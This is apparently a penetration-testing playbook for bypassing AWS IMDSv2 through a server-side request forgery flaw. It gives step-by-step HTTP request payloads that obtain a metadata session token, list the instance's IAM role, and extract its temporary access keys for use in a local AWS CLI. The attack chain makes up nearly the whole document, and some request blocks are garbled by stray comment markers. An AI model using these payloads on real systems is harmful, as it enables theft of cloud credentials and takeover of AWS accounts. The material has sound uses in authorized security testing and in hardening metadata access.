# AWS IMDSv2 SSRF Bypass

## When to Use
- When you have identified an SSRF vulnerability on an AWS EC2 instance, but IMDSv1 is disabled, and the service requires IMDSv2 tokens.
- When the SSRF vector gives you enough control to issue a `PUT` request and specify custom HTTP headers.


## Prerequisites
- Authorized scope and rules of engagement for the target environment
- Appropriate tools installed on the attack/analysis platform
- Understanding of the target technology stack and architecture
- Documentation template ready for findings and evidence capture

## Workflow

### Phase 1: Identifying the Restriction

Attempting a standard IMDSv1 request to `http://169.254.169.254/latest/meta-data/` yields a `401 Unauthorized` or requires a token. This confirms IMDSv2 is enforced.

### Phase 2: Generating the Token (The PUT Request)

IMDSv2 requires a session token. You must use the SSRF to send a `PUT` request to `/latest/api/token` with the header `X-aws-ec2-metadata-token-ttl-seconds`.

```http
# Concept: Push the SSRF payload to request the token PUT /latest/api/token HTTP/1.1
Host: 169.254.169.254
X-aws-ec2-metadata-token-ttl-seconds: 21600
```
*Note: If the SSRF only allows GET requests, bypassing IMDSv2 via this specific method is generally not possible unless you have header injection/request smuggling.*

### Phase 3: Extracting Metadata (The GET Request)

If Phase 2 succeeds, the response will contain the token string (e.g., `AQAAAHN...`).
You must then issue a second SSRF request (a `GET` request) to the metadata endpoint, injecting the acquired token via the `X-aws-ec2-metadata-token` header.

```http
# GET /latest/meta-data/iam/security-credentials/ HTTP/1.1
Host: 169.254.169.254
X-aws-ec2-metadata-token: AQAAAHN...
```

### Phase 4: Looting the IAM Keys

Identify the IAM role name from the previous step, then extract the temporary credentials.

```http
# GET /latest/meta-data/iam/security-credentials/<ROLE_NAME> HTTP/1.1
Host: 169.254.169.254
X-aws-ec2-metadata-token: AQAAAHN...
```
Configure your local AWS CLI with the retrieved `AccessKeyId`, `SecretAccessKey`, and `Token`.
